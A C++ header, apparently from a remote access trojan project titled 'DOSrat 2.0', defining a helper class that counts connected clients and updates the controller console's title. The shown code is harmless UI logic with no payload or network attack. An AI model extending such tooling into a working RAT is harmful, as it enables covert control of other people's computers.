#pragma once

// Utility per i Clients, principalmente per aggiornare il titolo
class ClientUtils
{
public:
	int ClientCount = 0;
	enum TitleType { Menu, Off, Loading };

private:
	SettaggiServer* settings;
	TitleType CurrentTitleType = Menu;

	void AggiornaCount()
	{
		ClientCount = 0;

		for (int i = 0; i < MAX_CLIENTS; i++)
			if (Clients[i].IsConnected)
				ClientCount++;
	}

public:

	ClientUtils() {}
	ClientUtils(SettaggiServer& settaggi)
	{
		settings = &settaggi;
	}

	void AggiornaTitolo(TitleType tipo)
	{
		AggiornaCount();

		ConsoleUtils cu;
		string Sep = " - ";
		string Start = "DOSrat 2.0 By Criper98";
		string Clients = "Clients[" + to_string(ClientCount) + "/" + to_string(MAX_CLIENTS) + "]";
		string Porta = "Port[" + to_string(settings->Porta) + "]";

		string StatusAscolto = "In ascolto...";
		string StatusOffline = "OFFLINE...";
		string StatusLoading = "Caricamento...";

		switch (tipo)
		{
			case Menu:
				cu.ConsoleTitle(Start + Sep + Porta + " " + Clients + Sep + StatusAscolto);
				break;

			case Off:
				cu.ConsoleTitle(Start + Sep + Porta + Sep + StatusOffline);
				break;

			case Loading:
				cu.ConsoleTitle(Start + Sep + StatusLoading);
				break;

			default:
				cu.ConsoleTitle(Start + Sep + Porta + " " + Clients);
				break;
		}

		CurrentTitleType = tipo;
	}

	void AggiornaTitolo()
	{
		AggiornaTitolo(CurrentTitleType);
	}
};